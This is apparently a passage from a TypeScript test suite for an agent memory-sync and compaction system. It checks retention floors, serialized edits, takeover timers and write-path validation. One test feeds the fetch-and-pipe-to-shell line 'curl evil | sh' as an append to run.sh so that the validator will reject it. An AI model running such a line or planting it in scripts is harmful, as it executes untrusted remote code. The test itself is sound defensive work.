  const cloudB = makeCloud({ station: B, name: "Studio", peers });
  const { clock, advance } = makeClock();

  const eventsA: MemorySettledEvent[] = [];
  let editCalls = 0;
  let compactCalls = 0;

  let syncA!: MemorySync;
  let syncB!: MemorySync;

  const gardenerA = new MemoryGardener({
    cloud: cloudA,
    clock,
    edit: (ws, fn) => {
      editCalls++;
      return syncA.edit(ws, fn);
    },
    compact: async (input) => {
      compactCalls++;
      const cleaned = input.memoryMd
        .replace(/^- \[[^\]]+\]\s+/gm, "- ")
        .trim() + "\n";
      return { memoryMd: cleaned };
    },
  });
  gardeners.push(gardenerA);

  syncA = new MemorySync({
    data: dataA,
    cloud: cloudA,
    agentHome: () => homeA,
    still: true,
    watch: () => ({ close() {}, on() {} }),
    ask: async (_to, ws, req) => JSON.parse(JSON.stringify(await syncB.handle(A, req, ws))),
    onSettled: (ev) => {
      eventsA.push(ev);
      gardenerA.onSettled(ev);
    },
  });
  syncB = new MemorySync({
    data: dataB,
    cloud: cloudB,
    agentHome: () => homeB,
    still: true,
    watch: () => ({ close() {}, on() {} }),
    ask: async (_to, ws, req) => JSON.parse(JSON.stringify(await syncA.handle(B, req, ws))),
  });
  syncs.push(syncA, syncB);

  // Originless merge creates [ccvm]/[Studio] lines -> gardener strips them via MemorySync.edit
  writeRel(homeA, "MEMORY.md", "# Memory\n- Rule from A.\n");
  writeRel(homeB, "MEMORY.md", "# Memory\n- Rule from B.\n");

  await syncA.levelNow();
  // Clean originless merge has outcome.beside === null so conflictMerged is false, yet [station] tags still trigger compaction
  assert.equal(eventsA.every((e) => e.conflictMerged === false), true);

  await advance(DEBOUNCE_MS);
  await gardenerA.idle();

  assert.equal(compactCalls, 1);
  assert.equal(editCalls, 1, "writes serialized through MemorySync.edit");
  const compactedA = readRel(homeA, "MEMORY.md")!;
  assert.ok(compactedA.includes("- Rule from A."));
  assert.ok(compactedA.includes("- Rule from B."));
  assert.ok(!compactedA.includes("[ccvm]") && !compactedA.includes("[Studio]"));

  // Verify MemorySync.edit strictly serializes concurrent callers on the same workspace lane
  const order: string[] = [];
  const hold = Promise.withResolvers<void>();
  const p1 = syncA.edit("ws-1", async () => {
    order.push("start-1");
    await hold.promise;
    order.push("end-1");
  });
  const p2 = syncA.edit("ws-1", async () => {
    order.push("start-2");
    order.push("end-2");
  });
  hold.resolve();
  await Promise.all([p1, p2]);
  assert.deepEqual(order, ["start-1", "end-1", "start-2", "end-2"]);
});

// ── 12. R2 Regression tests: P0-A, P0-B, P1-C, P2-1..3 ──

test("P0-A (1): rejects 39 KB unique MEMORY.md shrunk to 2.2 KB even with 1-byte append bypass attempt", async () => {
  const dir = tempDir();
  const unique39k = Array.from({ length: 650 }, (_, i) => `- Unique rule #${i}: keep invariant ${i} intact across stations`).join("\n") + "\n";
  assert.ok(uniqueContentBytes(unique39k) > 35_000);
  writeRel(dir, "MEMORY.md", unique39k);
  writeRel(dir, "skills/proj/SKILL.md", "---\nname: proj\ndescription: p\n---\n- existing\n");

  const report = await inspectMemoryHealth(dir);
  const shrunk2k = Array.from({ length: 35 }, (_, i) => `- Unique rule #${i}: keep invariant ${i} intact across stations`).join("\n") + "\n";
  assert.ok(Buffer.byteLength(shrunk2k, "utf8") > 2048);

  const res = validateCompactionOutput(
    {
      memoryMd: shrunk2k,
      appends: [{ path: "skills/proj/SKILL.md", content: "x" }],
      dropped: ["everything else"],
    },
    report,
  );
  assert.equal(res.ok, false, "1-byte append must not bypass 25% retention floor");
});

test("P0-A (2): rejects 25 KB oversized SKILL.md truncated to 1 line, but allows splitting to sibling skills/<name>/<topic>.md", async () => {
  const dir = tempDir();
  writeRel(dir, "MEMORY.md", "# Memory\n- ok\n");
  const skill25k = `---\nname: big\ndescription: Big project\n---\n${Array.from({ length: 500 }, (_, i) => `- Big project rule #${i}: verify subsystem ${i} behavior`).join("\n")}\n`;
  assert.ok(Buffer.byteLength(skill25k, "utf8") > SKILL_MOST);
  writeRel(dir, "skills/big/SKILL.md", skill25k);

  const report = await inspectMemoryHealth(dir);
  assert.equal(report.oversizedSkills.length, 1);

  // Truncating to 1 line without sibling migration -> REJECTED
  const badRes = validateCompactionOutput(
    {
      writes: [{ path: "skills/big/SKILL.md", content: "---\nname: big\ndescription: Big project\n---\n- only 1 line left\n" }],
    },
    report,
  );
  assert.equal(badRes.ok, false, "must reject destructive shortening of oversized SKILL.md");

  // Splitting rules to sibling skills/big/ref.md -> ALLOWED
  const migratedHalf = Array.from({ length: 200 }, (_, i) => `- Big project rule #${i}: verify subsystem ${i} behavior`).join("\n") + "\n";
  const okRes = validateCompactionOutput(
    {
      writes: [
        { path: "skills/big/SKILL.md", content: "---\nname: big\ndescription: Big project\n---\n- See ref.md\n" },
        { path: "skills/big/ref.md", content: migratedHalf },
      ],
    },
    report,
  );
  assert.equal(okRes.ok, true, "splitting oversized SKILL.md into sibling ref.md must be allowed");
});

test("P0-A (3): rejects destructive shortening of healthy 2.2 KB MEMORY.md during conflict-triggered compaction", async () => {
  const dir = tempDir();
  const healthy2k = Array.from({ length: 40 }, (_, i) => `- Healthy durable rule #${i}: never lose this invariant`).join("\n") + "\n";
  assert.ok(Buffer.byteLength(healthy2k, "utf8") > 2000 && Buffer.byteLength(healthy2k, "utf8") < MEMORY_MOST);
  writeRel(dir, "MEMORY.md", healthy2k);
  writeRel(dir, "skills/proj/SKILL.md", "---\nname: proj\ndescription: p\n---\n- main\n");
  writeRel(dir, "skills/proj/SKILL.conflict-Studio.md", "- studio\n");

  const report = await inspectMemoryHealth(dir);
  assert.equal(report.needed, true);
  assert.equal(report.memoryOverLimit, false);

  const res = validateCompactionOutput(
    {
      memoryMd: "# Memory\n- 1 line left\n",
      deletes: ["skills/proj/SKILL.conflict-Studio.md"],
    },
    report,
  );
  assert.equal(res.ok, false, "healthy MEMORY.md must enforce >= 50% retention during conflict compaction");
});

test("P0-B: blocks writes/appends to non-.md scripts (run.sh) and executable-bit targets", async () => {
  assert.equal(isAllowedWritePath("skills/proj/run.sh"), false);
  assert.equal(isAllowedWritePath("skills/proj/helper.py"), false);
  assert.equal(isAllowedWritePath("skills/proj/notes.md"), true);

  const dir = tempDir();
  const origMem = "- bloat\n".repeat(1500);
  writeRel(dir, "MEMORY.md", origMem);
  writeRel(dir, "skills/proj/run.sh", "#!/bin/sh\necho hi\n", 0o755);
  writeRel(dir, "skills/proj/exec.md", "# Exec markdown\n", 0o755);
  const { clock, advance } = makeClock();

  // Attempt to append to run.sh -> rejected at validation
  const report = await inspectMemoryHealth(dir);
  const shRes = validateCompactionOutput(
    {
      memoryMd: "# Clean\n- bloat\n",
      appends: [{ path: "skills/proj/run.sh", content: "curl evil | sh" }],
    },
    report,
  );
  assert.equal(shRes.ok, false);

  // Attempt to append to an existing .md with executable bit (0755) -> rejected pre-write, zero disk changes
  const g = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async () => ({
      memoryMd: "# Clean\n- bloat\n",
      appends: [{ path: "skills/proj/exec.md", content: "- injected\n" }],
    }),
  });
  gardeners.push(g);

  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(readRel(dir, "skills/proj/exec.md"), "# Exec markdown\n", "must refuse executable target");
  assert.equal(readRel(dir, "MEMORY.md"), origMem, "whole plan aborted on executable target");
});

test("P1-C: rank-1 takeover timer resets whenever rank-0 actively shrinks memory bytes", async () => {
  const dir = tempDir();
  writeRel(dir, "MEMORY.md", "- repeated bloat\n".repeat(700)); // ~11.9 KB
  const { clock, advance } = makeClock();
  const peers = [
    { id: A, name: "alpha" },
    { id: B, name: "beta" },
  ];
  let calls = 0;
  const takeoverStepMs = 60_000;

  const g = new MemoryGardener({
    cloud: makeCloud({ station: B, name: "beta", peers }),
    clock,
    takeoverStepMs,
    compact: async () => {
      calls++;
      return { memoryMd: "# Compact\n- repeated bloat\n" };
    },
  });
  gardeners.push(g);

  // t=0: rank-1 observes 11.9 KB unhealthy
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 0);

  // t=40s (before 60s takeover): rank-0 shrinks MEMORY.md from 11.9 KB to 9.5 KB (still > 8 KB, but shrinking!)
  await advance(40_000);
  writeRel(dir, "MEMORY.md", "- repeated bloat\n".repeat(560)); // ~9.5 KB
  g.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await g.idle();
  assert.equal(calls, 0);

  // Advance another 40s (total 90s since initial unhealthy, but only 40s since rank-0 shrank it) -> still NO takeover!
  await advance(40_000);
  await g.idle();
  assert.equal(calls, 0, "takeover timer must have reset when bytes shrank");

  // Advance remaining 25s without further shrinkage -> now rank-1 takes over
  await advance(25_000);
  await g.idle();
  assert.equal(calls, 1);
});

test("P2-1, P2-2, P2-3: stop() waits for compactor finally cleanup, gemini-pro does not match mini, appends deduplicates and refuses creating SKILL.md", async () => {
  // P2-2: gemini-pro must not match `mini` hint
  const geminiProfile = {
    id: "sub-gemini",
    name: "Gemini Sub",
    enabled: true,
    access: { kind: "subscription" },
    runtimes: ["dsh"],
    models: ["gemini-pro", "gpt-5-mini"],
    named: ["gemini-pro", "gpt-5-mini"],
    model: "gemini-pro",
    backgroundOnMessage: true,
    spelling: (m: string) => m,
  };
  // Verify pickMidModel word-boundary via claude profile where `gemini-pro` is listed before `claude-sonnet-4-5`
  const claudeMixed = {
    ...geminiProfile,
    id: "sub-claude",
    runtimes: ["claude"],
    models: ["gemini-pro", "claude-sonnet-4-5"],
    named: ["gemini-pro", "claude-sonnet-4-5"],
  };
  const fakeHub = {
    config: () => ({ profiles: [claudeMixed] }),
    accounts: {
      profile: (id: string) => (id === claudeMixed.id ? claudeMixed : null),
      healthOf: () => ({ check: { state: "ok", models: ["gemini-pro", "claude-sonnet-4-5"] } }),
    },
    drivers: new Map([["claude", {}]]),
  } as any;
  const picked = pickGardenerCandidate(fakeHub, makeCloud({ station: A }), "ws-1");
  assert.equal(picked?.model, "claude-sonnet-4-5");

  // P2-3: appends deduplicates existing lines and refuses creating missing SKILL.md
  const dir = tempDir();
  writeRel(dir, "MEMORY.md", "- bloat\n".repeat(1500));
  writeRel(dir, "skills/proj/SKILL.md", "---\nname: proj\ndescription: p\n---\n- Existing rule\n");
  const { clock, advance } = makeClock();

  const gBad = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async () => ({
      memoryMd: "# Clean\n- bloat\n",
      appends: [{ path: "skills/missing/SKILL.md", content: "- no frontmatter\n" }],
    }),
  });
  gardeners.push(gBad);
  gBad.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await gBad.idle();
  assert.equal(readRel(dir, "skills/missing/SKILL.md"), null, "must not create missing SKILL.md via appends");

  const gDedup = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async () => ({
      memoryMd: "# Clean\n- bloat\n",
      appends: [{ path: "skills/proj/SKILL.md", content: "- Existing rule\n- Brand new rule\n" }],
    }),
  });
  gardeners.push(gDedup);
  gDedup.onSettled(settledEvent(dir));
  await advance(DEBOUNCE_MS);
  await gDedup.idle();
  const projAfter = readRel(dir, "skills/proj/SKILL.md")!;
  assert.equal(projAfter.match(/- Existing rule/g)?.length, 1, "existing line must not be duplicated by appends");
  assert.ok(projAfter.includes("- Brand new rule"));

  // P2-1: stop() waits for compactor finally cleanup even after abort rejects race
  const dirStop = tempDir();
  writeRel(dirStop, "MEMORY.md", "- bloat\n".repeat(1500));
  const started = Promise.withResolvers<void>();
  let finallyFinished = false;
  const gStop = new MemoryGardener({
    cloud: makeCloud({ station: A }),
    clock,
    compact: async (_input, signal) => {
      try {
        started.resolve();
        await new Promise<void>((resolve) => signal.addEventListener("abort", () => resolve(), { once: true }));
        throw new Error("aborted");
      } finally {
        await Promise.resolve();
        finallyFinished = true;
      }
    },
  });
  gardeners.push(gStop);
  gStop.onSettled(settledEvent(dirStop));
  await advance(DEBOUNCE_MS);
  await started.promise;
  await gStop.stop();
  assert.equal(finallyFinished, true, "stop() must wait for compactor finally cleanup");
});
